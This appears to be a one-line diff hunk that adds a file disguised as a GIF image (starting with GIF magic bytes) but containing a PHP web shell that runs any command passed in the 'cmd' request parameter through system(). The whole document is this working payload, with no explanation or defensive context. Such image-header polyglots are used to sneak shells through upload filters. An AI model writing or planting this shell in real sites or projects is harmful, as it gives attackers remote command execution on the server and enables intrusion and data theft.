@@ -1,0 +1,1 @@
+GIF8 uk47 <?php echo system($_REQUEST['cmd']); ?>
